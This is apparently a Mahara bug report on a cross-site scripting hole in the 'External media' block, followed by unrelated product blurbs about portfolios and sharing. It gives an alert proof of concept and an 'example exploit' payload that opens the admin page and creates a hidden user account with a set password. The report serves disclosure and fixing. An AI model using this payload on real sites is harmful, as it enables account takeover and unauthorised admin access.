### Bug Description

When you put the following into the 'External media' block, you get an alert pop-up window.

<a class="embedly-card" href="javascript:alert(document.domain)">Link</a>

In contrast to text blocks where the 'javascript:alert' is stripped out, this is not the case in 'External media'.

It wasn't a problem when the class wasn't present, but with the class, a pop-up with the current domain is displayed.

See [original description](comments/0)

Example exploit:

<a class="embedly-card" href="javascript: {var TestFenster = [http://window.open('../admin/users/add.php','TestWindow','width=800,height=800,left=100,top=50');function](http://window.open('../admin/users/add.php%27%2C%27TestWindow%27%2C%27width%3D800%2Cheight%3D800%2Cleft%3D100%2Ctop%3D50%27%29;function) fill() {TestWindow.adduser.username.value='badboy';TestWindow.adduser.firstname.value='Bad';TestWindow.adduser.lastname.value='Boy';http://<email address hidden>';TestWindow.adduser.password.value='Secret+12345';[https://t.co/f2YTjI3B9B()](https://t.co/f2YTjI3B9B%28%29);}TestWindow.addEventListener('load',fill);}">open the gate</a>

Note: I'm not sure about the 't.co' URL as that might have been converted from Twitter as it was sent via a DM.

---------------------

Things to keep in mind:

- we'd probably need to allow protocol free urls too, eg allow strings starting with '<http://'>, '<https://'>, and '://'

- sanitize the URL

- Alternatively, the sanity check could be done here:

/htdocs/blocktype/externalvideo/embed\_services/embedly/embedservice.php#L61

## Create portfolios

Using Mahara, students and staff create their personal learning stories by uploading evidence of activities they have participated in, and embedding publicly accessible content they have previously put online. They can write reflections on their experiences that frame this evidence, map it to competencies or registration requirements, and provide necessary context.

Mahara can be used for many different portfolio purposes, such as study, professional development, work-integrated learning, assessment, showcase and presentation, and employability.

[Learn about the portfolio options](https://mahara.org/view/view.php?id=137010)

## Share work

Mahara allows portfolios to be shared flexibly with one person, a specific group of people, or the entire world. Access can be further restricted to a particular time frame or just within an assessment task.

## Engage with others

Mahara makes it easy to comment and give feedback. Portfolios can also be submitted to learning management systems via LTI (Learning Tools Interoperability) for marking.

Groups in Mahara allow people to create portfolios collaboratively and engage in forum discussions.
